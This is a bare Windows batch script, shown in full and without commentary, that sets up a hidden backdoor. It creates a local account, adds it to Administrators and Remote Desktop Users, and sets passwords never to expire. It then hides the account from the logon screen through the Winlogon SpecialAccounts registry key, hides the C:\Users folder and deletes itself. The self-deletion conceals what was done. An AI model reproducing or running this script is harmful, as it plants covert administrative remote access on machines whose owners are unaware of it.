@ echo off 
set login=LOGIN 
set pass=PASSWORD 
net user %login% %pass% /add 

net localgroup Administrators %login% /add 
net localgroup "Remote Desktop Users" %login% /add 
net accounts /maxpwage:unlimited 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %login% /t REG_DWORD /d "00000000" /f 
attrib +H C:\Users /S /D 
echo 
Timeout /t 15 
del %0 
exit
